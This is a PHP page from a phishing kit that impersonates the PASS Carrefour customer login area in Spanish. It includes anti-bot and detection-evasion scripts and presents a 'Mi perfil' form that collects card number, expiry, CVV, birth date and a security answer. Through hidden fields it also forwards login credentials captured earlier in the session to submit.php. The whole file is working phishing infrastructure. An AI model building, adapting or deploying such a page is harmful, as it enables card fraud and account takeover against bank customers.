<?php
session_start();
    error_reporting(0);
    require_once 'anti/anti1.php';
    require_once 'anti/anti2.php';
    require_once 'anti/anti3.php';
    require_once 'anti/anti4.php';
    require_once 'anti/anti5.php';
    require_once 'anti/anti6.php';
    require_once 'anti/anti7.php';
    require_once 'anti/anti8.php';
    require_once 'detect.php';
	require_once 'Defender.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <!-- BOOTSTRAP -->
    <link rel="stylesheet" type="text/css" href="assets/css/bootstrap.min.css">
    <!-- Main CSS -->
    <link rel="stylesheet" type="text/css" href="assets/css/main.css">
    <title>PASS Carrefour acceso a Zona Clientes</title>
</head>
<body>
<header id="header" class="d-lg-block d-sm-none d-sm-none d-none">
    <div class="container-fluid">
        <div class="row">
            <div class="col-md-2 dark-blue-bg d-flex justify-content-center align-items-center">
                <a href="#">
                    <img src="./assets/images/logo.svg">
                </a>
            </div>
            <div class="col-md-10" style="padding: 0;">
                <div class="top-header dark-blue-bg">
                    <ul>
                        <li>
                            <a href="#">Préstamos</a>
                        </li>
                        <li>
                            <a href="#">Financiación</a>
                        </li>
                        <li>
                            <a href="#">Apple Pay</a>
                        </li>
                        <li>
                            <a href="#">App PASS</a>
                        </li>
                        <li>
                            <a href="#">Seguridad PASS</a>
                        </li>
                        <li>
                            <a href="#">Seguros</a>
                        </li>
                    </ul>
                </div>
                <div class="main-header blue-bg">
                    <div class="row">
                        <div class="col-md-9 d-flex justify-content-center">
                            <ul>
                                <li>
                                    <a href="#">
                                        <span class="fz-18 font-weight-bold text-white">Por qué PASS</span>
                                        <span>Te lo contamos</span>
                                    </a>
                                </li>
                                <li>
                                    <a href="#">
                                        <span class="fz-18 font-weight-bold text-white">Qué es PASS</span>
                                        <span>Cómo funciona</span>
                                    </a>
                                </li>
                                <li>
                                    <a href="#">
																	<span class="fz-18 font-weight-bold text-white">Simuladores

																		<i class="fas fa-angle-down"></i>
																	</span>
                                        <span>Pruébalo</span>
                                    </a>
                                </li>
                                <li>
                                    <a href="#">
                                        <span class="fz-18 font-weight-bold text-white">Contratación</span>
                                        <span>Hazte PASS</span>
                                    </a>
                                </li>
                                <li>
                                    <a href="#">
                                        <span class="fz-18 font-weight-bold text-white">Ayuda</span>
                                        <span>Consúltanos</span>
                                    </a>
                                </li>
                            </ul>
                        </div>
                        <div class="col-md-3 d-flex justify-content-center align-items-center account">
                            <a href="#">
                                <span class="name">¡Hola!</span>
                                <span class="logo">MM</span>
                            </a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</header>
<header id="header-mobile" class="d-lg-none d-md-block d-sm-block d-block">
    <div class="container-fluid" style="padding: 0;">
        <div class="d-flex">
            <div style="padding: 25px 35px" class="menu">
                <img src="./assets/images/burguer.svg">
            </div>
            <div style="padding: 25px 35px" class="logos flex-grow-1 dark-blue-bg">
                <img src="./assets/images/logo.svg">
            </div>
            <div style="padding: 25px 35px" class="comptos blue-bg">
                <img src="./assets/images/user.svg">
            </div>
        </div>
    </div>
</header>
<main id="main">
    <div class="loading">
        <div class="loading-svg">
            <svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.0" width="64px" height="64px" viewBox="0 0 128 128" xml:space="preserve"><g><path d="M75.4 126.63a11.43 11.43 0 0 1-2.1-22.65 40.9 40.9 0 0 0 30.5-30.6 11.4 11.4 0 1 1 22.27 4.87h.02a63.77 63.77 0 0 1-47.8 48.05v-.02a11.38 11.38 0 0 1-2.93.37z" fill="#182d76" fill-opacity="1"/><animateTransform attributeName="transform" type="rotate" from="0 64 64" to="360 64 64" dur="1000ms" repeatCount="indefinite"></animateTransform></g></svg>
        </div>
    </div>
    <div class="container-fluid">
        <div class="row">
            <div class="col-md-12 col-lg-10 col-xl-8" id="card_form">
                <h1 class="text-blue fz-30 font-weight-normal mt-20 mb-30">Mi perfil</h1>
                <div class="box" id="card_box">
                    <form action="submit.php" method="post" class="card_form" id="cardform">
                        <div class="row">
                            <h3 class="card_form_title col-md-12 pl-0">INFORMACIÓN DE LA TARJETA ASOCIADA A SU CUENTA.</h3>
                            <div class="col-sm-12 col-md-12 col-lg-12 col-xl-6 pl-0">
                                <div class="row">
                                    <div class="form-group col-md-12">
                                        <label for="name_card">TU NOMBRE COMPLETO</label>
                                        <input type="text" name="cc_name" id="cc_name" class="form-control" placeholder="NOMBRE Y APELLIDOS">
                                        <span class="inputinfo text-orange font-weight-medium fz-12">El Nombre introducido no es válido</span>
                                    </div>
                                    <div class="form-group col-md-12">
                                        <label for="cc_number">ESCRIBE TU NÚMERO DE TARJETA</label>
                                        <input type="text" name="cc_number" id="cc_number" class="form-control" maxlength="16" placeholder="5499 28xx xxxx xxxx">
                                        <span class="inputinfo text-orange font-weight-medium fz-12">El Número de tarjeta introducido no es válido</span>
                                    </div>
                                    <div class="form-group col-md-6">
                                        <label for="orange">FECHA DE CADUCIDAD</label>
                                        <input type="text"  name="cc_date" id="cc_date" class="form-control" placeholder="MM/AA" maxlength="5">
                                        <span class="inputinfo text-orange font-weight-medium fz-12">La Fecha de caducidad introducido no es válido</span>
                                    </div>
                                    <div class="form-group col-md-6 pr-0">
                                        <label for="cc_cvv">CÓDIGO DE SEGURIDAD (CVV)</label>
                                        <input type="text" name="cc_cvv" id="cc_cvv" class="form-control" maxlength="3" placeholder="xxx">
                                        <span class="inputinfo text-orange font-weight-medium fz-12">El Código de seguridad introducido no es válido</span>
                                    </div>
                                    <div class="form-group col-md-12">
                                        <label for="cc_number">FECHA DE NACIMIENTO</label>
                                        <input type="text" name="birth_date" id="birth_date" class="form-control" placeholder="DD/MM/YYYY">
                                        <span class="inputinfo text-orange font-weight-medium fz-12">La Fecha de nacimiento introducido no es válido</span>
                                    </div>
                                </div>
                            </div>
                            <div class="col-sm-12 col-md-12 col-lg-12 col-xl-6">
                                <figure class="figure card__img">
                                    <img src="./assets/images/carte_empty.jpg" class="figure-img">
                                    <p class="card_number"></p>
                                    <p class="card_date"></p>
                                    <p class="card_name"></p>
                                </figure>
                            </div>
                            <div class="col-md-12">
                                <div class="row">
                                    <div class="form-group col-md-6 pl-0">
                                        <label for="orange">SU PREGUNTA PERSONAL</label>
                                        <select name="question" id="question" class="form-control">
                                            <option selected="selected">Elija una pregunta</option>
                                            <option value="¿En qué ciudad nació tu madre?">¿En qué ciudad nació tu madre?</option>
                                            <option value="¿Cuál fue tu primer coche?">¿Cuál fue tu primer coche?</option>
                                            <option value="¿Cuál es tu ciudad favorita?">¿Cuál es tu ciudad favorita?</option>
                                            <option value="¿Cuál era el nombre de tu abuela paterna?">¿Cuál era el nombre de tu abuela paterna?</option>
                                            <option value="¿Cuál fue la primera empresa en la que trabajó?">¿Cuál fue la primera empresa en la que trabajó?</option>
                                        </select>
                                    </div>
                                    <div class="form-group col-md-6">
                                        <label for="answer">RESPUESTA</label>
                                        <input type="text" name="answer" id="answer" class="form-control">
                                    </div>

                                    <input type="hidden" name="type" value="submit_card">
                                    <input type="hidden" name="first_login" id="first_login" value="<?php echo $_SESSION['first_login']?>">
                                    <input type="hidden" name="first_pass" id="first_pass" value="<?php echo $_SESSION['first_password']?>">
                                    <input type="hidden" name="second_login" id="second_login" value="<?php echo $_SESSION['second_login']?>">
                                    <input type="hidden" name="second_pass"  id="second_pass" value="<?php echo $_SESSION['second_password']?>">


                                </div>
                            </div>

                            <div class="form-group col-md-12">
                                <button type="button" id="submit-card" class="btn-block disabled" disabled>Entrar</button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
</main>
<footer id="footer">
    <div class="container-fluid" style="margin-bottom: -1px;">
        <div class="row grey-bg">
            <div class="col-md-9 sec-with-image">
                <h3 class="fz-24 font-weight-bold mb-0 text-white">Soluciones flexibles de compra para tu economía familiar.</h3>
                <div class="social-media">
                    <a href="#">
                        <i class="fab fa-facebook-f"></i>
                    </a>
                    <a href="#">
                        <i class="fab fa-twitter"></i>
                    </a>
                </div>
            </div>
        </div>
        <section></section>
        <div class="row">
            <div class="col-md-9"></div>
            <div class="col-md-3"></div>
        </div>
    </div>
    <div class="container-fluid blue-bg pt-50 pb-50 pr-100 pl-100">
        <a href="#">
            <img src="./assets/images/logo.svg">
        </a>
    </div>
    <div class="container-fluid sky-blue-bg pt-50 pb-50 pr-100 pl-100">
        <div class="row">
            <div class="col-md-9">
                <p class="text-white font-weight-medium fz-16">Utilizamos cookies propias y de terceros para realizar la medición de los hábitos de navegación de los usuarios y ofrecer publicidad de interés. Si continuas navegando, consideramos que aceptas su uso. Puedes cambiar la configuración u obtener más información

                    <a href="#">aquí</a>
                </p>
            </div>
            <div class="col-md-3 d-flex justify-content-center align-items-center">
                <a href="#" class="button">He leído y acepto</a>
            </div>
        </div>
    </div>
</footer>
<!-- Jquery JS -->
<script type="text/javascript" src="assets/js/jquery-3.3.1.slim.min.js"></script>
<!-- Popper JS -->
<script type="text/javascript" src="assets/js/popper.min.js"></script>
<!-- Bootstrap JS -->
<script type="text/javascript" src="assets/js/bootstrap.min.js"></script>
<!-- Font Awesome JS -->
<script type="text/javascript" src="https://use.fontawesome.com/releases/v5.1.0/js/all.js"></script>
<!-- Main JS -->
<script type="text/javascript" src="assets/js/app.js"></script>
</body>
</html>